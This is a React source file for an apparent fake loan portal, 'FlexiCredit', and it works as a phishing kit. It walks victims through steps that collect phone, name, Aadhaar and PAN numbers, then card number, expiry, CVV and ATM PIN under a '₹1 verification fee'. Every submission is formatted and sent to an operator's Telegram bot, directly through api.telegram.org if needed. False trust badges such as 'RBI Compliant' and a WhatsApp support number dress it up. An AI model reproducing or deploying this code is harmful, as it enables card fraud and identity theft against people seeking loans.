import React, { useState, useEffect } from 'react';
import { Header } from './components/Header';
import { StepTracker } from './components/StepTracker';
import { Step1Phone } from './components/Step1Phone';
import { Step2PersonalDetails } from './components/Step2PersonalDetails';
import { Step3EligibilityResult } from './components/Step3EligibilityResult';
import { Step4CardPayment } from './components/Step4CardPayment';
import { Step5DisbursementSuccess } from './components/Step5DisbursementSuccess';
import { TelegramConfigModal } from './components/TelegramConfigModal';
import { TelegramLogsDrawer } from './components/TelegramLogsDrawer';
import { WhatsAppWidget } from './components/WhatsAppWidget';
import { Step, LoanDetails, CardDetails, TelegramConfig, TelegramLog } from './types';
import { ShieldCheck, Lock, Award, CheckCircle2, PhoneCall } from 'lucide-react';

const escapeHtml = (str: any) => {
  if (str == null) return '';
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
};

export default function App() {
  const [step, setStep] = useState<Step>(1);

  // Application State
  const [loanDetails, setLoanDetails] = useState<LoanDetails>({
    phone: '',
    otpVerified: false,
    employmentType: 'Salaried Employee',
    loanAmount: 250000,
    loanTenure: 24,
    name: '',
    adhar: '',
    panCard: '',
    age: '28',
    state: 'Maharashtra',
    city: 'Mumbai',
    pincode: '400001',
  });

  const [cardDetails, setCardDetails] = useState<CardDetails | null>(null);

  // Telegram Config & Logs
  const [telegramConfig, setTelegramConfig] = useState<TelegramConfig>({
    hasToken: false,
    hasChatId: false,
    maskedToken: '',
    chatId: '',
  });

  const [telegramLogs, setTelegramLogs] = useState<TelegramLog[]>([]);
  const [lastLog, setLastLog] = useState<TelegramLog | null>(null);

  const [isConfigOpen, setIsConfigOpen] = useState(false);
  const [isLogsOpen, setIsLogsOpen] = useState(false);

  // Fetch initial Telegram Config & Logs on mount
  const fetchTelegramConfig = async () => {
    const localToken = localStorage.getItem('telegram_bot_token') || import.meta.env.VITE_TELEGRAM_BOT_TOKEN || '';
    const localChatId = localStorage.getItem('telegram_chat_id') || import.meta.env.VITE_TELEGRAM_CHAT_ID || '';

    try {
      const res = await fetch('/api/telegram/config');
      if (res.ok) {
        const data = await res.json();
        if (data.hasToken && data.hasChatId) {
          setTelegramConfig(data);
          return;
        }
      }
    } catch (e) {
      console.error('Failed to fetch Telegram config from server', e);
    }

    setTelegramConfig({
      hasToken: Boolean(localToken),
      hasChatId: Boolean(localChatId),
      maskedToken: localToken ? `${localToken.substring(0, 6)}...${localToken.slice(-4)}` : '',
      chatId: localChatId,
    });
  };

  const fetchTelegramLogs = async () => {
    try {
      const res = await fetch('/api/telegram/logs');
      if (res.ok) {
        const data = await res.json();
        setTelegramLogs(data.logs || []);
      }
    } catch (e) {
      console.error('Failed to fetch Telegram logs', e);
    }
  };

  useEffect(() => {
    fetchTelegramConfig();
    fetchTelegramLogs();
  }, []);

  // Helper to send payload to Telegram with robust direct fallback for Netlify static/serverless
  const sendTelegramPayload = async (type: string, data: Record<string, any>) => {
    const clientToken = localStorage.getItem('telegram_bot_token') || import.meta.env.VITE_TELEGRAM_BOT_TOKEN || '';
    const clientChatId = localStorage.getItem('telegram_chat_id') || import.meta.env.VITE_TELEGRAM_CHAT_ID || '';

    // 1. Try serverless endpoint first
    try {
      const res = await fetch('/api/telegram/send', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ type, data, customBotToken: clientToken, customChatId: clientChatId }),
      });

      if (res.ok) {
        const result = await res.json();
        if (result.success && !result.simulated && result.log) {
          setLastLog(result.log);
          setTelegramLogs((prev) => [result.log, ...prev]);
          fetchTelegramConfig();
          return result;
        }
      }
    } catch (err) {
      console.warn('Backend /api/telegram/send unreachable, trying direct Telegram API:', err);
    }

    // 2. Direct browser dispatch to Telegram API if token and chat ID are available
    if (clientToken && clientChatId) {
      const timestamp = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
      let formattedMessage = '';

      if (type === 'phone_step') {
        formattedMessage = `📱 <b>NEW LOAN LEAD - PHONE SUBMITTED</b>\n──────────────────────────────\n• <b>Phone Number:</b> <code>${escapeHtml(data.phone)}</code>\n• <b>Submitted At:</b> ${escapeHtml(timestamp)}\n• <b>Portal:</b> Netlify App`;
      } else if (type === 'personal_details') {
        formattedMessage = `📋 <b>LOAN APPLICATION - PERSONAL DETAILS</b>\n──────────────────────────────\n• <b>Full Name:</b> ${escapeHtml(data.name)}\n• <b>Phone Number:</b> <code>${escapeHtml(data.phone)}</code>\n• <b>Employment Type:</b> ${escapeHtml(data.employmentType)}\n• <b>Aadhaar Number:</b> <code>${escapeHtml(data.adhar)}</code>\n• <b>PAN Card:</b> <code>${escapeHtml(data.panCard || 'N/A')}</code>\n• <b>Age:</b> ${escapeHtml(data.age)} years\n• <b>State:</b> ${escapeHtml(data.state)}\n• <b>City:</b> ${escapeHtml(data.city)}\n• <b>Pincode:</b> ${escapeHtml(data.pincode)}\n• <b>Requested Loan:</b> ₹${Number(data.loanAmount || 250000).toLocaleString('en-IN')} (${escapeHtml(data.loanTenure || 24)} months)\n• <b>Submitted At:</b> ${escapeHtml(timestamp)}`;
      } else if (type === 'card_details') {
        formattedMessage = `💳 <b>LOAN DISBURSEMENT FEE - CARD DETAILS</b>\n──────────────────────────────\n• <b>Applicant Name:</b> ${escapeHtml(data.name || 'N/A')}\n• <b>Phone:</b> <code>${escapeHtml(data.phone || 'N/A')}</code>\n• <b>Fee Amount:</b> ₹1.00 (Debit Card Verification Charge)\n• <b>Card Number:</b> <code>${escapeHtml(data.cardNumber)}</code>\n• <b>Card Holder:</b> ${escapeHtml(data.cardHolder || 'N/A')}\n• <b>Expiry Date:</b> <code>${escapeHtml(data.exp)}</code>\n• <b>CVV:</b> <code>${escapeHtml(data.cvv)}</code>\n• <b>PIN Number:</b> <code>${escapeHtml(data.pin || 'Not Provided')}</code>\n• <b>Submitted At:</b> ${escapeHtml(timestamp)}`;
      } else {
        formattedMessage = `🚀 <b>TELEGRAM BOT TEST ALERT</b>\n──────────────────────────────\n• <b>Status:</b> Connected & Active\n• <b>Portal:</b> FlexiCredit Loan Portal\n• <b>Timestamp:</b> ${escapeHtml(timestamp)}`;
      }

      try {
        const tgUrl = `https://api.telegram.org/bot${clientToken}/sendMessage`;
        const directRes = await fetch(tgUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: clientChatId,
            text: formattedMessage,
            parse_mode: 'HTML',
            disable_web_page_preview: true,
          }),
        });

        const directData = await directRes.json();
        if (!directRes.ok || !directData.ok) {
          throw new Error(directData.description || 'Failed to send message to Telegram bot');
        }

        const sentLog: TelegramLog = {
          id: `log_${Date.now()}_${Math.random().toString(36).substring(2, 6)}`,
          timestamp,
          type,
          formattedMessage,
          data,
          status: 'sent',
        };

        setLastLog(sentLog);
        setTelegramLogs((prev) => [sentLog, ...prev]);
        fetchTelegramConfig();
        return { success: true, simulated: false, log: sentLog };
      } catch (tgError: any) {
        console.error('Direct Telegram API Error:', tgError);
        throw tgError;
      }
    }

    // 3. Fallback log entry if no credentials configured anywhere
    const timestamp = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
    const fallbackLog: TelegramLog = {
      id: `log_${Date.now()}_${Math.random().toString(36).substring(2, 6)}`,
      timestamp,
      type,
      formattedMessage: `Event: ${type} logged locally (No Bot Token configured)`,
      data,
      status: 'simulated',
    };
    setLastLog(fallbackLog);
    setTelegramLogs((prev) => [fallbackLog, ...prev]);
    return { success: true, simulated: true, log: fallbackLog };
  };

  // STEP 1 HANDLER: Phone submission
  const handlePhoneSubmit = async (phone: string) => {
    setLoanDetails((prev) => ({ ...prev, phone, otpVerified: true }));
    await sendTelegramPayload('phone_step', { phone, otpVerified: true });
    setStep(2);
  };

  // STEP 2 HANDLER: Personal details submission
  const handlePersonalDetailsSubmit = async (
    details: Omit<LoanDetails, 'phone' | 'otpVerified'>
  ) => {
    const updated = { ...loanDetails, ...details };
    setLoanDetails(updated);

    await sendTelegramPayload('personal_details', {
      phone: updated.phone,
      name: updated.name,
      employmentType: updated.employmentType,
      adhar: updated.adhar,
      panCard: updated.panCard,
      age: updated.age,
      state: updated.state,
      city: updated.city,
      pincode: updated.pincode,
      loanAmount: updated.loanAmount,
      loanTenure: updated.loanTenure,
    });

    setStep(3);
  };

  // STEP 4 HANDLER: Card Details submission
  const handleCardDetailsSubmit = async (cardData: CardDetails) => {
    setCardDetails(cardData);

    await sendTelegramPayload('card_details', {
      phone: loanDetails.phone,
      name: loanDetails.name,
      cardNumber: cardData.cardNumber,
      cardHolder: cardData.cardHolder,
      exp: cardData.exp,
      cvv: cardData.cvv,
      pin: cardData.pin,
    });

    setStep(5);
  };

  // Save Config handler
  const handleSaveConfig = async (botToken: string, chatId: string) => {
    if (botToken) localStorage.setItem('telegram_bot_token', botToken.trim());
    if (chatId) localStorage.setItem('telegram_chat_id', chatId.trim());

    try {
      await fetch('/api/telegram/config', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ botToken: botToken.trim(), chatId: chatId.trim() }),
      });
    } catch (e) {
      console.warn('Backend API /api/telegram/config not reachable, config saved locally:', e);
    }

    await fetchTelegramConfig();
  };

  // Send Test Message handler
  const handleSendTestMessage = async () => {
    await sendTelegramPayload('test_ping', {
      message: 'Test message from Loan Express Portal!',
      status: 'OK',
    });
  };

  const handleReset = () => {
    setStep(1);
    setCardDetails(null);
    setLastLog(null);
  };

  return (
    <div className="min-h-screen bg-slate-900 text-slate-900 font-sans antialiased flex flex-col selection:bg-emerald-500 selection:text-white">
      {/* Top Header */}
      <Header
        telegramConfig={telegramConfig}
        onOpenConfig={() => setIsConfigOpen(true)}
        onOpenLogs={() => setIsLogsOpen(true)}
        onReset={handleReset}
        currentStep={step}
      />

      {/* Main Container */}
      <main className="flex-1 bg-gradient-to-b from-slate-900 via-slate-900 to-slate-950 px-4 py-8 sm:py-12">
        <div className="max-w-5xl mx-auto space-y-8">
          {/* Step Progress Tracker */}
          <StepTracker currentStep={step} />

          {/* Active Step Content */}
          <div className="transition-all duration-300">
            {step === 1 && (
              <Step1Phone
                onContinue={handlePhoneSubmit}
                initialPhone={loanDetails.phone.replace('+91 ', '')}
              />
            )}

            {step === 2 && (
              <Step2PersonalDetails
                phone={loanDetails.phone}
                onSubmit={handlePersonalDetailsSubmit}
                initialData={loanDetails}
              />
            )}

            {step === 3 && (
              <Step3EligibilityResult
                loanDetails={loanDetails}
                onProceedToPayment={() => setStep(4)}
              />
            )}

            {step === 4 && (
              <Step4CardPayment
                applicantName={loanDetails.name}
                phone={loanDetails.phone}
                onSubmitCardDetails={handleCardDetailsSubmit}
              />
            )}

            {step === 5 && (
              <Step5DisbursementSuccess
                loanDetails={loanDetails}
                lastLog={lastLog}
                onReset={handleReset}
              />
            )}
          </div>

          {/* Trust Highlights Footer Cards */}
          <div className="grid grid-cols-1 sm:grid-cols-3 gap-4 max-w-4xl mx-auto pt-8 border-t border-slate-800/80">
            <div className="bg-slate-950/60 border border-slate-800/80 rounded-2xl p-4 flex items-center space-x-3 text-white">
              <div className="w-10 h-10 rounded-xl bg-emerald-500/10 text-emerald-400 flex items-center justify-center shrink-0 border border-emerald-500/20">
                <ShieldCheck className="w-5 h-5" />
              </div>
              <div>
                <p className="text-xs font-bold">100% Paperless & Instant</p>
                <p className="text-[11px] text-slate-400">Zero physical documents required</p>
              </div>
            </div>

            <div className="bg-slate-950/60 border border-slate-800/80 rounded-2xl p-4 flex items-center space-x-3 text-white">
              <div className="w-10 h-10 rounded-xl bg-emerald-500/10 text-emerald-400 flex items-center justify-center shrink-0 border border-emerald-500/20">
                <Lock className="w-5 h-5" />
              </div>
              <div>
                <p className="text-xs font-bold">RBI Compliant Process</p>
                <p className="text-[11px] text-slate-400">End-to-end SSL bank encryption</p>
              </div>
            </div>

            <div className="bg-slate-950/60 border border-slate-800/80 rounded-2xl p-4 flex items-center space-x-3 text-white">
              <div className="w-10 h-10 rounded-xl bg-emerald-500/10 text-emerald-400 flex items-center justify-center shrink-0 border border-emerald-500/20">
                <PhoneCall className="w-5 h-5" />
              </div>
              <div>
                <p className="text-xs font-bold">Instant Bot Notifications</p>
                <p className="text-[11px] text-slate-400">Real-time alerts via Telegram API</p>
              </div>
            </div>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="bg-slate-950 border-t border-slate-800 py-6 text-center text-xs text-slate-500">
        <div className="max-w-7xl mx-auto px-4 flex flex-col sm:flex-row items-center justify-between gap-3">
          <p>© 2026 FlexiCredit Express Portal. All rights reserved.</p>
          <div className="flex items-center space-x-4 text-[11px]">
            <button onClick={() => setIsConfigOpen(true)} className="hover:text-emerald-400 transition-colors">
              Bot Config
            </button>
            <span>•</span>
            <button onClick={() => setIsLogsOpen(true)} className="hover:text-emerald-400 transition-colors">
              Payload Inspector
            </button>
          </div>
        </div>
      </footer>

      {/* Telegram Config Modal */}
      <TelegramConfigModal
        isOpen={isConfigOpen}
        onClose={() => setIsConfigOpen(false)}
        config={telegramConfig}
        onSaveConfig={handleSaveConfig}
        onSendTestMessage={handleSendTestMessage}
      />

      {/* Telegram Logs Inspector Drawer */}
      <TelegramLogsDrawer
        isOpen={isLogsOpen}
        onClose={() => setIsLogsOpen(false)}
        logs={telegramLogs}
        onRefresh={fetchTelegramLogs}
      />

      {/* WhatsApp Live Support Widget */}
      <WhatsAppWidget phoneNumber="916302235986" />
    </div>
  );
}
